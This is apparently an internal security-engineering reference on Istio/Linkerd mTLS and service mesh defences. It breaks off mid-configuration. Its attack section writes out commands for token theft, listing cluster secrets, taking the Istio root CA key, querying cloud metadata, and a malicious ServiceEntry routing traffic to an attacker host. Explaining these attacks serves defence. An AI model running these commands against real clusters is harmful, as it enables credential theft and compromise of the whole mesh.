# mTLS & Service Mesh Security (Istio/Linkerd) — Security Engineering Breakdown

**Classification:** Internal Engineering Reference  
**Audience:** Platform Engineers, Security Architects, SREs, Kubernetes Security Engineers  
**Assumed Reader:** Will be interviewed on this system. Every claim is mechanically precise.  
**Key References:** CNCF SPIFFE/SPIRE spec, Istio Security Architecture, Linkerd Architecture docs, NIST SP 800-204 (Microservices Security), CIS Kubernetes Benchmark, OWASP Kubernetes Security Cheat Sheet.

---

## Table of Contents

1. [Request/Execution Lifecycle](#1-requestexecution-lifecycle)
2. [Control Plane vs Data Plane Architecture](#2-control-plane-vs-data-plane-architecture)
3. [Identity & Access Management Flow](#3-identity--access-management-flow)
4. [Core System Mechanics](#4-core-system-mechanics)
5. [Attack Mechanics](#5-attack-mechanics)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Modes & Edge Cases](#8-failure-modes--edge-cases)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## 1. Request/Execution Lifecycle

### The Setting: A Production Service Mesh

A payment processing platform runs on Kubernetes with Istio deployed. Three services are relevant: `frontend` (public-facing), `payment-api` (internal), and `ledger-db-proxy` (wraps the database). A user submits a payment. We trace every hop.

---

### T=0ms — External Request Arrives at Ingress

The user's browser sends `POST https://pay.example.com/checkout`. DNS resolves to the load balancer IP, which points to the Istio Ingress Gateway — a standalone Envoy proxy pod in the `istio-system` namespace, distinct from sidecar Envoys.

```
Browser → Cloud LB (TCP:443) → Istio IngressGateway Pod
          [External TLS terminates HERE — not at the app]
```

The IngressGateway's TLS configuration:
- Certificate: Issued by a public CA (Let's Encrypt or ACM), stored in a `Secret` in `istio-system`.
- TLS termination: Envoy terminates the external TLS session.
- What happens next: The request enters the mesh. The IngressGateway proxies to the `frontend` service — over **mTLS this time** (mesh-internal traffic).

**Sequence so far:**

```
T=0ms:   Browser SYN → Cloud LB
T=1ms:   TCP established to LB → LB forwards to IngressGateway
T=2ms:   External TLS handshake (ECDHE, TLS 1.3)
T=10ms:  TLS session established, HTTP/2 request received by Envoy
T=10ms:  Envoy consults its routing table (xDS from Istiod)
         Route: POST /checkout → frontend.default.svc.cluster.local:8080
T=11ms:  Envoy initiates mTLS to frontend's sidecar proxy
```

---

### T=11ms — mTLS Handshake: IngressGateway → Frontend Sidecar

The IngressGateway Envoy connects to the `frontend` pod on port 8080. But it doesn't connect directly to the `frontend` container — it connects to the **sidecar Envoy** listening on port 15006 (inbound). The iptables rules redirect all inbound traffic to port 15006.

mTLS handshake mechanics:

```
IngressGateway Envoy          Frontend Sidecar Envoy
       │                               │
       │  ClientHello (TLS 1.3)        │
       │  SNI: frontend.default...     │
       │──────────────────────────────>│
       │                               │
       │  ServerHello + Certificate    │
       │  Cert: SPIFFE://cluster.local/ns/default/sa/frontend
       │  Signed by: Istio CA (Istiod) │
       │<──────────────────────────────│
       │                               │
       │  Client Certificate:          │
       │  SPIFFE://cluster.local/ns/istio-system/sa/istio-ingressgateway
       │──────────────────────────────>│
       │                               │
       │  [Both verify each other's    │
       │   SPIFFE URI against          │
       │   AuthorizationPolicy]        │
       │                               │
       │  [mTLS established]           │
       │──────────────────────────────>│ Application data (HTTP/2)
```

Key point: The certificates contain **SPIFFE IDs** (not IP addresses, not hostnames). The SPIFFE ID encodes: `spiffe://trust-domain/ns/namespace/sa/service-account`. This is workload identity — tied to the Kubernetes service account, not the pod IP or DNS name.

---

### T=20ms — Request Reaches Frontend Container

The frontend sidecar Envoy accepts the mTLS connection, strips TLS, and forwards the plaintext HTTP/2 request to `localhost:8080` where the frontend container listens. The container sees:

```
POST /checkout HTTP/1.1
X-Forwarded-For: <original client IP>
X-Envoy-Original-Dst-Host: frontend:8080
host: pay.example.com

{...payment data...}
```

The frontend container has **no awareness of mTLS** — it receives plaintext on localhost. The security is entirely in the sidecar.

---

### T=25ms — Frontend Calls Payment-API

The frontend container makes an outbound call to `payment-api.default.svc.cluster.local:9090`. This outbound traffic:

1. Hits the **iptables OUTPUT chain** (set up by the init container at pod startup).
2. Gets redirected to the **outbound listener on port 15001** (the sidecar's outbound Envoy).
3. Envoy consults xDS routing: destination is `payment-api`.
4. Envoy initiates mTLS to `payment-api`'s sidecar proxy.
5. Authorization policy check: is `frontend`'s service account allowed to call `payment-api`?

```yaml
# AuthorizationPolicy that permits this call:
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-api-allow-frontend
  namespace: default
spec:
  selector:
    matchLabels:
      app: payment-api
  rules:
  - from:
    - source:
        principals:
        - "cluster.local/ns/default/sa/frontend"
    to:
    - operation:
        methods: ["POST"]
        paths: ["/payment/*"]
```

If `frontend` called `/admin/*` or used a different HTTP method: Envoy returns 403 **without the request ever reaching payment-api's container**. The enforcement is at the proxy layer.

---

### T=50ms — Response Returns

The response bubbles back through the same chain. Each hop is mTLS-secured. The Envoy sidecar at the frontend:
1. Receives the payment-api response.
2. Strips mTLS.
3. Forwards plaintext to `localhost:8080`.
4. Frontend constructs the checkout response.
5. Frontend sidecar outbound proxy picks up the response to IngressGateway.
6. IngressGateway re-encrypts with the public-facing TLS cert.
7. Response reaches the browser.

**Total:** ~80ms end-to-end, of which mTLS overhead per hop is approximately 0.5-2ms (TLS session resumption with session tickets eliminates most of the handshake cost on subsequent requests).

---

## 2. Control Plane vs Data Plane Architecture

### The Fundamental Split

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        CONTROL PLANE                                    │
│                     (istiod / Linkerd control plane)                    │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Pilot (Traffic Management)                                      │   │
│  │  - Reads: VirtualService, DestinationRule, ServiceEntry CRDs    │   │
│  │  - Translates to: Envoy xDS configuration                       │   │
│  │  - Pushes: xDS updates to all sidecar Envoys                    │   │
│  │  - Protocol: gRPC streaming (xDS v3 API)                        │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Citadel / CA (Certificate Authority)                            │   │
│  │  - Issues: workload certificates (SPIFFE SVIDs)                 │   │
│  │  - Watches: Kubernetes ServiceAccounts                           │   │
│  │  - Signs: CSRs from sidecar proxies                             │   │
│  │  - Root CA: stored in Kubernetes Secret or external HSM         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Galley (Config Validation) [pre-1.5, now merged into istiod]   │   │
│  │  - Validates: all Istio CRDs before they take effect            │   │
│  │  - Prevents: invalid routing rules from breaking traffic        │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Communication: istiod → data plane via gRPC (port 15010/15012)        │
│  API surface: istiod exposes xDS API to Envoy proxies                  │
└─────────────────────────────────────────────────────────────────────────┘
              │                              │
              │ xDS (gRPC streaming)         │ CSR (gRPC)
              │                              │
┌─────────────▼──────────────────────────────▼───────────────────────────┐
│                         DATA PLANE                                       │
│                      (Envoy sidecar proxies)                            │
│                                                                          │
│  Per-pod sidecar Envoy (injected automatically):                        │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Inbound listener: port 15006                                    │   │
│  │  - Accepts: all inbound TCP (redirected by iptables)             │   │
│  │  - Terminates: mTLS                                              │   │
│  │  - Enforces: AuthorizationPolicy (RBAC at proxy layer)          │   │
│  │  - Forwards: plaintext to local container port                  │   │
│  │                                                                  │   │
│  │  Outbound listener: port 15001                                   │   │
│  │  - Accepts: all outbound TCP (redirected by iptables)           │   │
│  │  - Applies: routing rules from xDS (VirtualService)             │   │
│  │  - Initiates: mTLS to destination sidecar                       │   │
│  │  - Enforces: egress policies                                     │   │
│  │                                                                  │   │
│  │  Admin port: 15000 (localhost only)                              │   │
│  │  - Envoy config dump, stats, health check                       │   │
│  │                                                                  │   │
│  │  Metrics port: 15020 (Prometheus scrape endpoint)               │   │
│  └─────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────┘
```

### xDS: The Control Plane Protocol

xDS (Discovery Service) is the API by which Istiod pushes configuration to Envoy. It is a gRPC-based streaming protocol. When you apply a `VirtualService` CRD, this is the chain:

```
kubectl apply -f virtualservice.yaml
       │
       ▼
Kubernetes API Server (validates + stores in etcd)
       │
       ▼ (watch notification)
istiod (Pilot component watches all mesh CRDs + Services + Endpoints)
       │
       ▼ (translates to Envoy config)
xDS Push: {LDS, CDS, EDS, RDS} to all affected Envoys
       │
       ▼
Envoy proxy (acknowledges, applies new config, old config discarded)

xDS resource types:
  LDS: Listener Discovery Service — defines ports/protocols/filters
  CDS: Cluster Discovery Service — defines upstream clusters (services)
  EDS: Endpoint Discovery Service — defines actual pod IPs per cluster
  RDS: Route Discovery Service — defines routing rules (path → cluster)

Push timing:
  Change detected → aggregated over 100ms debounce → pushed to Envoys
  Envoy acks: confirms receipt (NACK if config invalid)
  Partial failure: Envoy rejects invalid config, keeps last valid state
```

### Namespace and Container Isolation

```
Kubernetes Namespace Boundaries:
  - Namespaces: Linux kernel namespaces via container runtime (containerd)
  - Network namespace: each pod has a separate network namespace
    (separate network stack, separate iptables, separate routing table)
  - PID namespace: processes in the pod cannot see processes outside
  - Mount namespace: separate filesystem view

Pod's network namespace (where iptables rules live):
  [container net namespace]
    iptables rules (installed by istio-init initContainer):
      PREROUTING: redirect all inbound to :15006 (except from Envoy itself)
      OUTPUT: redirect all outbound to :15001 (except to Envoy, except DNS)
      
  The Envoy sidecar container shares the pod's network namespace
  (that's why it can intercept traffic on those ports)
  
  The app container and Envoy container: SEPARATE filesystems, SEPARATE
  process spaces, but SHARED network namespace and (optionally) PID namespace.

Container escape implications:
  If a vulnerability allows container escape from app container:
    - Attacker reaches the node's network namespace
    - Can see all pod traffic on the node (before iptables redirect)
    - Can potentially reach the Envoy admin port (15000) of other pods
    - Can access the Kubernetes API server if node has permissions
  
  This is why:
    - Envoy admin port must be localhost-only
    - Pod security must prevent privileged containers
    - Node-level network policies must limit pod-to-pod visibility
```

---

## 3. Identity & Access Management Flow

### SPIFFE/SPIRE: Workload Identity from First Principles

SPIFFE (Secure Production Identity Framework for Everyone) solves: "How does a process prove what it is, without a static secret baked into the container image?"

```
SPIFFE Identity = URI: spiffe://trust-domain/path
Example:           spiffe://cluster.local/ns/default/sa/payment-api

Trust domain: the Kubernetes cluster (could be multi-cluster)
Path:         encodes namespace + service account name

This URI is embedded in the SAN (Subject Alternative Name) of an X.509 certificate.
```

### Identity Bootstrap Sequence

```
┌──────────────────────────────────────────────────────────────────────────┐
│              WORKLOAD CERTIFICATE ISSUANCE FLOW                          │
│                                                                          │
│  Kubernetes API Server                istiod (CA)             Envoy      │
│         │                                │                       │       │
│  Pod scheduled on node                  │                       │       │
│  kubelet starts pod                     │                       │       │
│         │                               │                       │       │
│  ┌──────▼─────────────────────────────────────────────────────────────┐ │
│  │  Kubernetes Service Account Token (JWT) automatically mounted      │ │
│  │  at: /var/run/secrets/kubernetes.io/serviceaccount/token           │ │
│  │  Audience: istio-ca                                                │ │
│  │  Signed by: Kubernetes API server                                  │ │
│  └──────┬─────────────────────────────────────────────────────────────┘ │
│         │                               │                       │       │
│         │  Envoy starts (init container done)                   │       │
│         │                               │      CSR + JWT token  │       │
│         │                               │<──────────────────────│       │
│         │                               │                       │       │
│         │  TokenReview API call         │                       │       │
│         │<──────────────────────────────│                       │       │
│         │  (validate JWT: is this       │                       │       │
│         │   the right service account?) │                       │       │
│         │──────────────────────────────>│                       │       │
│         │  {valid: true, sa: "payment"} │                       │       │
│         │                               │                       │       │
│         │                        Sign CSR with                  │       │
│         │                        Istio Root CA                  │       │
│         │                        SPIFFE ID embedded             │       │
│         │                        in SAN field                   │       │
│         │                               │                       │       │
│         │                               │  Certificate (PEM)    │       │
│         │                               │──────────────────────>│       │
│         │                               │  Private key (in mem) │       │
│         │                               │                       │       │
│         │                               │  [cert valid: 24h]    │       │
│         │                               │  [auto-rotated at 12h]│       │
└──────────────────────────────────────────────────────────────────────────┘
```

**Why 24-hour certificate lifetime matters:** Short-lived certs are the primary defense against certificate theft. If a cert is stolen, it expires within 24 hours (often 12 hours in practice since rotation happens at the halfway mark). No CRL needed — the cert simply expires. This is a deliberate design choice.

### Full IAM Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    IAM ARCHITECTURE FOR SERVICE MESH                            │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                    IDENTITY PLANE                                        │   │
│  │                                                                          │   │
│  │  Kubernetes API Server                                                   │   │
│  │  ┌─────────────────────────────────────┐                                │   │
│  │  │  ServiceAccount: payment-api        │                                │   │
│  │  │  - Namespace: default               │                                │   │
│  │  │  - automountServiceAccountToken:    │                                │   │
│  │  │    true (or false + manual mount)   │                                │   │
│  │  │  - Bound to: RBAC Role              │                                │   │
│  │  └─────────────────────────────────────┘                                │   │
│  │                │                                                          │   │
│  │                │ TokenReview                                              │   │
│  │                ▼                                                          │   │
│  │  ┌─────────────────────────────────────┐                                │   │
│  │  │  istiod Certificate Authority       │                                │   │
│  │  │  - Root CA key: in-cluster Secret   │←── External CA (optional)     │   │
│  │  │    or external HSM                  │    (Vault, AWS PCA, GCP CAS)  │   │
│  │  │  - Issues: X.509 SVIDs (SPIFFE)     │                                │   │
│  │  │  - Lifetime: 24h, rotate at 12h     │                                │   │
│  │  │  - Trust bundle: distributed to     │                                │   │
│  │  │    all Envoys via xDS               │                                │   │
│  │  └─────────────────────────────────────┘                                │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                              │                                                  │
│                              │ Certificate (SPIFFE SVID)                        │
│                              │                                                  │
│  ┌───────────────────────────▼─────────────────────────────────────────────┐   │
│  │                    ENFORCEMENT PLANE                                     │   │
│  │                                                                          │   │
│  │  Envoy Sidecar (in each pod)                                            │   │
│  │  ┌──────────────────────────────────────────────────────────────────┐  │   │
│  │  │  TLS Peer Authentication:                                         │  │   │
│  │  │  - Verify: peer cert signed by trusted CA                        │  │   │
│  │  │  - Extract: SPIFFE ID from peer's cert SAN                       │  │   │
│  │  │  - Check: ID against AuthorizationPolicy                         │  │   │
│  │  │                                                                   │  │   │
│  │  │  Authorization Check:                                             │  │   │
│  │  │  if source.principal NOT in allowlist:                            │  │   │
│  │  │      return 403 Forbidden (before app container sees request)     │  │   │
│  │  └──────────────────────────────────────────────────────────────────┘  │   │
│  │                                                                          │   │
│  │  OPA / External Authorizer (optional):                                  │   │
│  │  - ext_authz filter calls OPA on each request                          │   │
│  │  - Policy as code evaluated per-request                                │   │
│  │  - Rego policies version-controlled in Git                             │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                    POLICY PLANE                                          │   │
│  │                                                                          │   │
│  │  Kubernetes RBAC:                                                        │   │
│  │  - Who can modify AuthorizationPolicies? (only mesh-admin ClusterRole)  │   │
│  │  - Who can read Secrets? (only istiod ServiceAccount)                   │   │
│  │  - Who can exec into pods? (break-glass only, audited)                  │   │
│  │                                                                          │   │
│  │  Istio AuthorizationPolicy → Envoy RBAC filter                          │   │
│  │  Istio PeerAuthentication → Envoy TLS filter                            │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### RBAC at Two Layers

**Kubernetes RBAC** (who can do what to Kubernetes resources):
```yaml
# Only platform team can modify mesh security policies
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: mesh-security-admin
rules:
- apiGroups: ["security.istio.io"]
  resources: ["authorizationpolicies", "peerauthentications"]
  verbs: ["get", "list", "create", "update", "delete"]
```

**Istio AuthorizationPolicy** (which services can talk to which):
```yaml
# Enforced by Envoy at the data plane — not Kubernetes RBAC
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all-then-allow  # Zero-trust default
  namespace: default
spec: {}  # Empty spec = deny all traffic in this namespace
---
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-frontend-to-payment
spec:
  selector:
    matchLabels:
      app: payment-api
  rules:
  - from:
    - source:
        principals:
        - "cluster.local/ns/default/sa/frontend-service-account"
    to:
    - operation:
        methods: ["POST"]
        paths: ["/api/payment"]
    when:
    - key: request.headers[x-request-id]
      notValues: [""]  # Must have a request ID
```

---

## 4. Core System Mechanics

### iptables Interception: The Foundation

When a pod starts with sidecar injection enabled, an init container (`istio-init`) runs **before** any application containers and installs iptables rules in the pod's network namespace:

```bash
# What istio-init does (simplified):

# Redirect all inbound traffic to Envoy's inbound port
iptables -t nat -A PREROUTING -p tcp -j REDIRECT --to-ports 15006

# Redirect all outbound traffic to Envoy's outbound port
iptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 15001

# Exceptions: Envoy itself (UID 1337) bypasses the redirect
# (prevents redirect loop)
iptables -t nat -A OUTPUT -m owner --uid-owner 1337 -j RETURN

# Exception: loopback (127.0.0.1 traffic skips redirect)
iptables -t nat -A OUTPUT -d 127.0.0.1/8 -j RETURN

# Exception: specific ports (e.g., kubelet health checks, metrics)
iptables -t nat -A PREROUTING -p tcp --dport 15090 -j RETURN  # Prometheus

# After istio-init exits: rules persist in the network namespace
# The app container starts, its traffic is now automatically intercepted
```

**Why this works without app modification:** The app thinks it's connecting to `payment-api:9090` directly. But its connection gets transparently redirected to Envoy on port 15001. Envoy knows the original destination via `SO_ORIGINAL_DST` socket option (iptables sets this when doing REDIRECT). Envoy then:
1. Looks up `payment-api:9090` in its CDS (cluster configuration from Istiod).
2. Gets the actual pod IPs from EDS.
3. Opens an mTLS connection to the selected pod's sidecar on port 15006.

### Envoy's Filter Chain

Envoy processes traffic through a chain of network filters:

```
Inbound connection to pod:
  [TCP listener on :15006]
         │
         ▼
  [TLS Inspector Filter]
  Determines: is this TLS? what SNI?
         │
         ▼
  [HTTP Connection Manager (HCM)]
  Parses: HTTP/1.1 or HTTP/2
         │
         ▼
  [HTTP Filters (ordered chain)]:
    1. ext_authz       → call external authorizer (OPA, custom)
    2. jwt_authn       → validate JWT tokens (if configured)
    3. rbac            → Istio AuthorizationPolicy enforcement
    4. router          → route to upstream cluster or local backend
         │
         ▼
  [Upstream cluster or local app]

Each filter can: allow, deny, or modify the request.
A filter returning "deny": request stops, 403/401 returned.
```

### Certificate Rotation Mechanics

```
Timeline for a workload certificate:

  T=0h:   Envoy requests cert from istiod (CSR over gRPC)
  T=0h:   istiod signs cert, validity: 24h
  T=12h:  Envoy detects cert is halfway through lifetime
          (configurable via PILOT_CERT_TTL_SECONDS)
  T=12h:  Envoy requests NEW cert from istiod (proactive rotation)
  T=12h:  New cert issued, Envoy switches to new cert
  T=12h:  Old cert still valid for 12 more hours (allows in-flight connections)
  T=24h:  Old cert expires, fully replaced

Rotation without downtime:
  - Envoy holds both old and new cert during overlap window
  - New connections use new cert
  - Existing connections with old cert: still valid until those sessions end
  - No service restart required — Envoy handles cert rotation in-process

Root CA rotation (harder):
  - istiod generates new root CA
  - Distributes new root CA trust bundle to all Envoys (via xDS)
  - Both old and new root CA trusted simultaneously (overlap window)
  - All workload certs re-issued signed by new root CA
  - Old root CA removed from trust bundle after all certs rotated
  - Window: configurable, typically 7 days
  - Risk: if old root CA private key was compromised, 7-day window
```

### mTLS Mode: STRICT vs PERMISSIVE vs DISABLE

```yaml
# PeerAuthentication controls mTLS mode:
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: default
spec:
  mtls:
    mode: STRICT  # Reject all non-mTLS connections
    # PERMISSIVE: accept both mTLS and plaintext (migration path)
    # DISABLE:    plaintext only (do not use in production)
```

**PERMISSIVE mode details:** In PERMISSIVE mode, Envoy acts as a TLS multiplexer. It inspects the first bytes of a connection:
- If it looks like a TLS ClientHello: handle as mTLS.
- If it's plaintext HTTP: handle as plaintext.

This is implemented via Envoy's protocol detection. The Envoy filter `tls_inspector` peeks at the first 5 bytes to determine if TLS is being initiated.

**PERMISSIVE mode security risk:** A service with PERMISSIVE mode can be called by **any** client, authenticated or not. An attacker can simply send plaintext HTTP to bypass mTLS. PERMISSIVE is only acceptable during migration. Production clusters must be STRICT.

---

## 5. Attack Mechanics

### Attack 1: Exploiting PERMISSIVE mTLS Mode (Lateral Movement)

**Context:** An attacker has compromised one pod in the cluster (e.g., via a web application vulnerability that gave RCE). They want to call internal services that should be inaccessible.

**Attacker assumption:** Code execution in a pod (`vuln-app` in namespace `default`). The attacking pod has no service account certificate for `payment-api`'s required identity.

**Why PERMISSIVE mode fails:**

```yaml
# Misconfigured PeerAuthentication:
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: default
spec:
  mtls:
    mode: PERMISSIVE  # ← THE VULNERABILITY
```

With PERMISSIVE mode, the `payment-api` sidecar accepts plaintext connections. An attacker from the compromised pod can:

```bash
# From inside the compromised pod (no cert, no service account):
curl http://payment-api.default.svc.cluster.local:9090/api/payment \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"amount": 10000, "to": "attacker-account"}'
# Returns: 200 OK — request succeeded without any mTLS!
```

**Why this works:** The `payment-api`'s sidecar Envoy, in PERMISSIVE mode, detects no TLS handshake and processes the request as plaintext. The AuthorizationPolicy's `source.principals` check is based on the mTLS peer certificate's SPIFFE ID. With no mTLS, there is no peer certificate, so the source principal is empty/unknown. Default behavior in many Istio versions: a missing principal is treated as "unauthenticated" which may match `"*"` wildcard rules or default ALLOW policies.

**The AuthorizationPolicy doesn't save you if written naively:**

```yaml
# Seemingly secure policy that fails in PERMISSIVE mode:
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-api-policy
spec:
  selector:
    matchLabels:
      app: payment-api
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/frontend-service-account"]
  # This ONLY allows frontend-service-account. Seems locked down.
  # BUT: in PERMISSIVE mode, a plaintext request has NO principal.
  # An unauthenticated request: principal = ""
  # The rule above doesn't match "" — so this rule says "deny if no match"?
  # WRONG: Istio's default is ALLOW if there's an allow rule but the source
  # doesn't match any "from" clause? No — actually it depends on Istio version.
  # Pre-1.8 behavior: a request from unauthenticated source was ALLOWED
  # if the AuthorizationPolicy only had "allow" rules (not deny-all + allow).
```

**Detection opportunity:**
- `istio_requests_total` metric with `security_policy="none"` (no mTLS) from unexpected sources.
- Access logs showing requests with empty `x-forwarded-client-cert` header.
- No `connection_security_policy` in Envoy access log.

---

### Attack 2: Service Account Token Theft → Privilege Escalation

**Attacker assumption:** Code execution in a pod with a highly privileged service account (e.g., a monitoring agent that has `cluster-admin` or broad RBAC permissions). This is a common misconfiguration.

**Step 1: Discover the mounted service account token:**

```bash
# From inside the compromised pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Returns a JWT like:
# eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJhdWQiOlsia3ViZXJuZXRlcyJd...

# Decode the JWT header + payload (base64):
echo "eyJhdWQiOlsia3ViZXJuZXRlcyJd..." | base64 -d
# {
#   "aud": ["kubernetes"],
#   "exp": 1715774625,     ← time-limited (1 hour default in Kubernetes 1.22+)
#   "iss": "kubernetes/serviceaccount",
#   "kubernetes.io": {
#     "namespace": "monitoring",
#     "serviceaccount": {"name": "prometheus", "uid": "..."}
#   }
# }
```

**Step 2: Use the token to call the Kubernetes API:**

```bash
# Kubernetes API server is typically at 10.96.0.1:443 (cluster IP)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -k --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/kube-system/secrets

# If prometheus SA has RBAC permission to list secrets:
# Returns ALL secrets including certificate authority keys, etcd creds, etc.
```

**Step 3: Extract the Istio Root CA secret:**

```bash
# Istio's root CA is stored in:
curl -k --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/istio-system/secrets/cacerts

# Returns the istiod root CA private key.
# With this key, attacker can issue arbitrary SPIFFE certificates
# for ANY service account in ANY namespace.
# The entire mesh's mTLS security is now compromised.
```

**Why the default configuration fails:**

1. `automountServiceAccountToken: true` is the Kubernetes default — every pod gets a token even if it doesn't need API server access.
2. Monitoring tools (Prometheus, Grafana) often run with broad RBAC permissions because operators don't want to debug permission issues.
3. The `cacerts` secret in `istio-system` is readable by anything with `get secrets` permission in `istio-system`.

**Root cause chain:**
```
Overpermissive RBAC → Service Account token accessible →
API server access → Secrets readable → Root CA exfiltrated →
Ability to sign arbitrary certs → All mTLS in the mesh bypassed
```

---

### Attack 3: SSRF to Cloud Metadata Service via Istio ServiceEntry

**Attacker assumption:** Code execution in a pod. Attacker wants to exfiltrate cloud credentials (IAM role credentials from EC2/GKE/Azure metadata service at `169.254.169.254`).

**Step 1: Check if the metadata IP is reachable:**

```bash
# From inside a pod:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AWS EC2: returns role name if metadata service is accessible
```

**Why Istio doesn't automatically block this:**

Istio's default behavior for traffic to external IPs not registered in the service registry:
- `ALLOW_ANY` (default in older Istio): all outbound traffic is allowed.
- `REGISTRY_ONLY`: only traffic to registered services is allowed.

```yaml
# MeshConfig setting that controls this:
apiVersion: v1
kind: ConfigMap
metadata:
  name: istio
  namespace: istio-system
data:
  mesh: |
    outboundTrafficPolicy:
      mode: ALLOW_ANY  # ← THE VULNERABILITY (should be REGISTRY_ONLY)
```

**Step 2: With ALLOW_ANY, traffic to 169.254.169.254 flows freely:**

The Envoy sidecar's outbound listener receives the connection to `169.254.169.254:80`. In ALLOW_ANY mode, Envoy creates a "passthrough" cluster that forwards the traffic without mTLS (since it's an external IP). The connection reaches the metadata service.

**Step 3: Attacker-controlled ServiceEntry can be used to route traffic:**

If the attacker has access to apply Kubernetes resources (e.g., compromised CI/CD pipeline), they can create a `ServiceEntry` that routes legitimate-looking traffic to attacker infrastructure:

```yaml
# Malicious ServiceEntry:
apiVersion: networking.istio.io/v1alpha3
kind: ServiceEntry
metadata:
  name: exfil-channel
  namespace: default
spec:
  hosts:
  - "internal-metrics.company.com"  # legitimate-looking hostname
  ports:
  - number: 443
    name: https
    protocol: HTTPS
  location: MESH_EXTERNAL
  resolution: DNS
  endpoints:
  - address: "attacker.evil.com"     # actual destination
```

Now any service calling `internal-metrics.company.com` is routed to `attacker.evil.com`. This is a DNS-level hijack via Istio configuration.

**Detection:**
- Audit log: `ServiceEntry` creation/modification should trigger alerts.
- Egress: unexpected connections to `169.254.169.254` (should be blocked by NetworkPolicy).
- New external endpoints in ServiceEntry resources: monitored by OPA admission controller.

---

### Attack 4: Certificate Authority Compromise via Istiod Pod Escape

**Attacker assumption:** Container escape from a pod running in `istio-system` namespace (e.g., via a vulnerability in istiod itself). Attacker reaches the node's filesystem.

**What's at risk on the node:**

```bash
# From the node (after container escape):

# 1. Find where istiod stores the root CA:
find /var/lib/kubelet/pods -name "*.pem" 2>/dev/null
# Or find it via the pod's tmpfs mount:
cat /proc/$(pgrep pilot-discovery)/maps | grep mem
# The root CA private key is in istiod's memory

# 2. Alternative: access the Kubernetes Secret directly via the node's
#    kubelet credentials (kubelet has client cert for API server):
curl -k --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
     --key /var/lib/kubelet/pki/kubelet-client-current.pem \
     https://API_SERVER/api/v1/namespaces/istio-system/secrets/cacerts
# If the node's kubelet has list/get secrets RBAC (it shouldn't, but often does)
```

**Why the default configuration fails:**

1. `istiod` by default stores the root CA in a Kubernetes `Secret` object. Any pod that can `get` the `cacerts` secret in `istio-system` has the root CA.
2. Kubernetes RBAC doesn't automatically restrict access to `istio-system` secrets from node-level processes.
3. If `istiod` runs with broad Kubernetes RBAC (which it does by default — it needs to watch all namespaces), a compromise of istiod gives an attacker those permissions.

---

## 6. Security Controls & Defensive Mechanics

### Zero-Trust Policy Framework

**Layer 1: Network Policies (Kubernetes NetworkPolicy)**

NetworkPolicy is implemented by the CNI plugin (Calico, Cilium, etc.) at the kernel level (eBPF or iptables). It operates on IP addresses, not identities. This is a coarse-grained first layer:

```yaml
# Default deny all ingress in all namespaces:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: default
spec:
  podSelector: {}     # Applies to all pods
  policyTypes:
  - Ingress            # Default deny ingress
---
# Allow: only payment-api pods can receive traffic from frontend pods:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-payment
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: payment-api
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 9090
```

**Limitation of NetworkPolicy:** It works on pod labels, which can be spoofed (any pod with the right labels would be allowed). This is why mTLS AuthorizationPolicy (based on cryptographic identity) is a stronger control.

**Layer 2: Istio AuthorizationPolicy (cryptographic enforcement)**

Already shown above. Key properties:
- Enforced by Envoy at the proxy level
- Based on SPIFFE identity (cryptographic — can't be spoofed without the private key)
- Fine-grained: method, path, headers, conditions

**Layer 3: OPA (Open Policy Agent) as External Authorizer**

For complex policies that Istio's AuthorizationPolicy can't express:

```yaml
# Istio config to call OPA for authorization:
apiVersion: networking.istio.io/v1alpha3
kind: EnvoyFilter
metadata:
  name: opa-ext-authz
spec:
  configPatches:
  - applyTo: HTTP_FILTER
    match:
      context: SIDECAR_INBOUND
    patch:
      operation: INSERT_BEFORE
      value:
        name: envoy.filters.http.ext_authz
        typed_config:
